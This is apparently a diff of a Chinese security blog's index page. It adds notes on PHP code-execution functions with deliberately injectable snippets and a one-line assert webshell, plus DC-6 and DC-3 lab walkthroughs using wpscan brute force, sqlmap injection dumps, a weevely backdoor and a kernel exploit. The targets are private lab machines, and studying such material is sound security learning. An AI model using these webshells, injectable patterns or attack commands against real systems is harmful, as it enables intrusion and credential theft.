+<h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p>
+<p>如果参数为字符串，它将会被assert()当做php代码来执行</p>
+<p>版本只能为：5.x</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>如果我们提交?func=fo，即可写入shell.php</p>
+<h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p>
+<p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
+<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
+<pre><code>&lt;?php
+
+$id=$_GET[&#39;id&#39;];
+
+$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;
+
+$f1 = create_function(&#39;$a&#39;, $str2);
+
+$f1(&quot;abc&quot;);
+?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
+<h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
+<p>示例1：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>当我们所要匹配的字符串中含有test时</p>
+<p>我们直接传入参数？a=phpinfo()即可执行代码。</p>
+<p>示例2：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p>
+<h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p>
+<p>调用一个回调函数处理字符串,</p>
+<p>call_user_func_array($callback,$param arr)</p>
+<p>利用回调函数处理数组。</p>
+<p><strong>示例1：</strong></p>
+<img src=QQ截图20200218130741.png />
+
+<img src="QQ截图20200218130753.png" style="zoom:67%;" />
+
+<p><strong>示例2：</strong></p>
+<p>一句话木马：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p>
+<h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p>
+<p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>
+
+<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+ <img src="QQ截图20200218133234.png"  />
+
+
+
+<h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p>
+<p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p>
+<p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<img src="QQ截图20200218202542.png" style="zoom:67%;" />
+
+<h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p>
+<p>使用用户自定义的比较函数对数组中的值进行排序 </p>
+<p>usort(array, cmp_function)；</p>
+<p>uasort(array, cmp_function)；</p>
+<h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p>
+<ul>
+<li><p><strong>Fopen()</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span>
+<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+</li>
+</ul>
+<ul>
+<li><strong>file_get_content()</strong></li>
+</ul>
+<ul>
+<li><strong>curl</strong></li>
+</ul>
+<h4 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h4><h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>system():执行外部程序，并且返回输出</p>
+<h5 id="shell-exec-没有回显的命令执行"><a href="#shell-exec-没有回显的命令执行" class="headerlink" title="shell_exec(没有回显的命令执行)"></a>shell_exec(没有回显的命令执行)</h5><p>shell_exec():通过shell环境，并且将完整的输出以字符串方式返回</p>
+<h5 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h5><p>执行外部程序并且显示原始输出</p>
+<h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><p>​    exec():执行一个外部程序 </p>
+<h5 id="ob-start函数"><a href="#ob-start函数" class="headerlink" title="ob_start函数"></a>ob_start函数</h5><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p>
+<ul>
+<li><strong>Copy()</strong></li>
+</ul>
+<p>copy() 函数拷贝文件</p>
+<p>语法：copy(source,destination)</p>
+<pre><code>&lt;?php
+echo copy(&quot;source.txt&quot;,&quot;target.txt&quot;);
+?&gt;</code></pre><p>输出1。</p>
+<ul>
+<li><p><strong>File_get_contents()/File_put_contents</strong></p>
+<ul>
+<li><p>file_get_contents() 把整个文件读入一个字符串中。</p>
+<p>语法：file_get_contents(path,include_path,context,start,max_length)</p>
+<pre><code>&lt;?php
+echo file_get_contents(&quot;test.txt&quot;);
+?&gt;</code></pre></li>
+<li><p>file_put_contents() 函数把一个字符串写入文件中。</p>
+<p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p>
+<pre><code>&lt;?php
+echo file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);
+?&gt;</code></pre></li>
+</ul>
+</li>
+<li><p><strong>File()</strong></p>
+<ul>
+<li><p>file() 函数把整个文件读入一个数组中。</p>
+<p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p>
+<p>语法：file(path,include_path,context)</p>
+<pre><code>&lt;?php
+print_r(file(&quot;test.txt&quot;));
+?&gt;</code></pre></li>
+</ul>
+</li>
+<li><p><strong>Fopen()</strong></p>
+<ul>
+<li><p>open() 函数打开一个文件或 URL。</p>
+<p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p>
+<p>语法：fopen(filename,mode,include_path,context)</p>
+<pre><code>&lt;?php
+$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);
+$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);
+$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);
+$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);
+$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);
+?&gt;</code></pre></li>
+</ul>
+</li>
+<li><p><strong>Move_uploaded_file()</strong></p>
+<ul>
+<li><p>move_uploaded_file() 函数把上传的文件移动到新位置。</p>
+<p>如果成功该函数返回 TRUE，如果失败则返回 FALSE。</p>
+<p>语法：move_uploaded_file(file,newloc)</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Readfile()</strong></p>
+<ul>
+<li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p>
+<p>语法：readfile(filename,include_path,context)</p>
+<pre><code>&lt;?php
+echo readfile(&quot;test.txt&quot;);
+?&gt;</code></pre></li>
+</ul>
+</li>
+<li><p><strong>Rename()</strong></p>
+<ul>
+<li><p>rename() 函数重命名文件或目录。</p>
+<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
+<p>语法：rename(oldname,newname,context)</p>
+<pre><code>&lt;?php
+rename(&quot;images&quot;,&quot;pictures&quot;);
+?&gt;</code></pre></li>
+</ul>
+</li>
+<li><p><strong>Unlink()</strong></p>
+<ul>
+<li><p>unlink() 函数删除文件。</p>
+<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
+<p>语法：unlink(filename,context)</p>
+<pre><code>&lt;?php
+$file = &quot;test.txt&quot;;
+if (!unlink($file))
+{
+echo (&quot;Error deleting $file&quot;);
+}
+else
+{
+echo (&quot;Deleted $file&quot;);
+}
+?&gt;</code></pre></li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/31/dc-6-ba-ji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/31/dc-6-ba-ji/" itemprop="url">DC-6靶机</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-31T22:20:37+08:00">
+                2020-03-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="DC-6靶机学习"><a href="#DC-6靶机学习" class="headerlink" title="DC-6靶机学习"></a>DC-6靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p>
+<p>然后我们首先考虑获得靶机的IP地址。使用arp去发现内网存活主机，从而确定靶机IP为192.168.153.137。</p>
+<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200455.png" alt=""></p>
+<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用神器nmap对靶机IP进行探测。</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.137 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200850.png" alt=""></p>
+<p>我们发现靶机开放了22端口和80端口。</p>
+<p>我们直接访问IP发现被重定向到了<a href="http://wordy。" target="_blank" rel="noopener">http://wordy。</a></p>
+<p>我们编辑 /etc/hosts中的文件添加该域名</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200211113951.png" alt=""></p>
+<p>我们再次尝试访问192.168.153.137发现成功跳转，</p>
+<p>我们利用火狐自带插件进行指纹识别</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200209201216.png" alt=""></p>
+<p>我们可以确定该cms为WordPress，且数据库为MYSQL</p>
+<h4 id="第三步、漏洞扫描"><a href="#第三步、漏洞扫描" class="headerlink" title="第三步、漏洞扫描"></a>第三步、漏洞扫描</h4><p>使用wordpress漏洞测试工具wpscan进行网站漏洞探测，wpscan是一款针对wordpress的黑盒漏洞扫描器，可以获得包括版本、主体、插件等信息。</p>
+<pre><code>wpscan --url http://Wordy -u t</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209201612.png" alt=""></p>
+<p>通过扫描我们得到几个系统的用户名信息。我们接下来思考能否获得任一账号的密码。</p>
+<h4 id="第四步、漏洞利用"><a href="#第四步、漏洞利用" class="headerlink" title="第四步、漏洞利用"></a>第四步、漏洞利用</h4><p>我们首先根据作者的提示，使用到kali里面的rockyou.txt字典</p>
+<p>使用解压命令：</p>
+<pre><code>gzip -d rockyou.txt.gz</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209202612.png" alt=""></p>
+<pre><code>cat rockyou.txt | grep k01&gt;k01.txt</code></pre><p>将里面的k01的部分导出到dc6目录下面的passwords.txt</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200209202622.png" alt=""></p>
+<p>接着使用wpscan的暴力破解命令：</p>
+<pre><code>wpscan --url wordy -u -p passwords.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209203905.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200209204033.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200209204455.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/dc-3-ba-ji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/12/dc-3-ba-ji/" itemprop="url">DC-3靶机</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T23:07:00+08:00">
+                2020-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><p>[TOC]</p>
+<h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
+<p>使用nmap进行二层主机发现</p>
+<pre><code>nmap -sn 192.168.153.1/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p>
+<h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p>
+<pre><code>nmap -sV 192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p>
+<p>发现80端口开放且运行Apache服务。</p>
+<p>我们网页访问IP的80端口</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p>
+<p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p>
+<h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p>
+<pre><code>  不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p>
+<pre><code>perl joomscan.pl -u http://192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p>
+<p>我们得到了该Joomla的具体版本号为3.7.0.</p>
+<h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p>
+<p>发现存在一个sql注入漏洞。</p>
+<p>我们将该漏洞文档复制到根目录下，然后打开。</p>
+<pre><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla-sql.txt
+cat joomla-sql.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p>
+<p>文档中给出了sqlmap自动注入的payload.</p>
+<h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p>
+<ul>
+<li>查询所有数据库：</li>
+</ul>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p>
+<p>查询当前使用数据库：</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]
+</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p>
+<p>查询joomladb数据库下的表：</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p>
+<p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p>
+<p>最后我们输出name,password的信息：</p>
+<pre><code>sqlmap  -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p>
+<h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p>
+<p>使用dirsearch扫出后台文件</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p>
+<p>进入后台登录页面并登录</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p>
+<p>选择Templates模板，选择templates第一个模板即可，</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p>
+<p>用weevely生成php后门文件.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p>
+<p>复制代码新建webshell.php文件，粘贴代码，保存</p>
+<p>然后用weevely连，成功拿到shell.</p>
+<h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p>
+<p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p>
+<p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p>
+<p>我们将exp下载下来然后经过一系列的解压后</p>
+<pre><code>unzip 39772.zip 
+
+cd 39772
+
+tar -xvf exploit.tar  
+
+cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
+<p>​                ./doubleput</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p>
+<p>但是不知道为什么一直没法成功。。。。。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/duan-kou-shen-tou-zong-jie/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -301,6 +2049,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -1227,6 +2997,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1436,7 +3228,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/03/12/linux-an-zhuang/" itemprop="url">linux安装</a></h1>
